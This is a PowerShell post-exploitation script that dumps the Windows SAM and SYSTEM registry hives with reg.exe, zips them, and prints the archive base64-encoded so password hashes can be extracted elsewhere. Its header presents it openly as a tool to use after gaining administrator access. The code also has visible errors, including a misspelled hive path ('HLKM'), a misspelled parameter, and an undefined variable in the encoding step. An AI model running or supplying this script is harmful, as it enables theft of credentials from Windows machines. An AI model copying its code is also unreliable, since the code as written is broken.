<#
# Powershell Sam dumper. once you have root. Use this to dump the archive. Then you can
# use another program to actually get the hashes out of it.
# sam_copy (C) Macarthur Inbody AGPLv3 2019
#>
<#
# This function will get the filesize of any resource(only to the first child level)
# It's only parameter is the "file". I'm calling it a file because in my background 
# everything's a file including folders.
#>
#Param($file)
function print-filesize($file){
	[single]$size=0
	[string]$unit=''
	#First I determine whether the resrouce is a directory or if it's a file.
	if (  (Get-Item $file) -is [System.IO.DirectoryInfo]){
		#Then we get the total size of this folder(first level only).
		$folder_info=(Get-ChildItem $file | Measure-Object -Property Length -Sum)
		#set size to this value.
		$size=$folder_info.Sum
	}
	else{
		#if it's a file we simply get it's length.
		$size=(Get-Item $file).length
	}
	<#
	# These if statements will format it to be in various forms
	# It does TiB, GiB, MiB, KiB and B.
	# I know windows says MB but I am hoping it's 1024 based.
	#>
	
	if ($size -gt 1TB){
		$unit='TiB'
		$size=$size/1TB
	}
	elseif ($size -gt 1GB){
		$unit='GiB'
		$size=$size/1GB
	}
	elseif ($size -gt 1MB) {
		$unit='MiB'
		$size=$size/1MB
	}
	elseIf($size -gt 1KB){
		$unit='KiB'
		$size=$size/1KB
	}
	else{
		$unit='B'
		$size=$size
	}
	#TODO: SEe how I can modify this to work a lot better honestly like
	# string concatentation.
	#I return the size value.
	[string]::Format("{0:0.00} {1}",$size,$unit)	

}
#Create the directory where we're going to dump the data.
mkdir SAM_DUMP
#Tell them that we're about to dump the hive.
Write-Host "About to dump SAM Registry Hive."
#dump the SAM hive from the registry.
reg.exe save HKLM\SAM SAM_DUMP\SAM
#tell them we're done.
Write-Host "Done dumping SAM."
#tell them we're about to dump it.
Write-Host "Dumping SYSTEM Registry hive."
#dump the SYSTEM hive from the registry.
reg.exe save HLKM\SYSTEM SAM_DUMP\SYSTEM
#done with the hives tell them that much.
Write-Host "Done dumping All Hives."
#compress the directory,
Write-Host "About to compress the hives."
Compress-Archive -compressionlevel optimal -path SAM_DUMP -DestionationPath sam_dump.zip
#tell them that we're about to do the base64 encoded data.
Write-Host "Done compressing the hives."
Write-Host "Compressed Size"
print-filesize('sam_dump.zip')
Write-Host "Original Size"
print-filesize('SAM_DUMP')
Write-Host "Base64 Encoded Archive"
Write-Host ""
Write-Host [Convert]::ToBase64String([IO.File]::ReadAllBytes($FileName))
Write-Host ""
Write-Host "Done Encoding"
